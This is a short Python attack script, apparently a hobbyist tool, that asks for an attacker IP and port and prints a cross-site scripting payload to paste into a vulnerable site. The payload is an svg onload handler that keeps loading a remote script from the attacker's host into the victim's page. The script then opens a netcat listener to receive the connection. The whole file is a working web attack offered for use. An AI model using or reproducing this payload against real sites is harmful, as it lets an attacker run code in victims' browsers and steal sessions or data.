#!/bin/python

# Informacoes do script

#-------------------------------#
# Creator by: H7X               #
# Date: 24/09/2021              #
# Language: python		#
# Version: 1.0			#
#-------------------------------#

# Cores e variaveis

white = '\033[1;97m'
green = '\033[1;32m'
red = '\033[1;31m'
purple = '\033[1;35m'
end = '\033[1;m'
que =  '\033[1;35m[?]\033[1;m'

import os
import sys
import time

# Banner

os.system("clear")
os.system('cat bns.txt')

# Funcionamento

ip = input('%s Your ip >>> ' % purple)
port = input('%s Your port >>> ' % purple)

print (' ')
print (' =======================================')
print ('       COLE ISSO NO LOCAL VULNERAVEL' )
print (' =======================================')
print ('           | | | | | | | | | ')
print ('           v v v v v v v v v')
print (' ')

openshell = '<svg/onload=setInterval(function(){with(document)body.appendChild(createElement("script")).src="//%s:%s"},100);>\n' % (ip, port)
print (openshell)
print ('Waiting connection...')

os.system('nc -lp %s' % port)
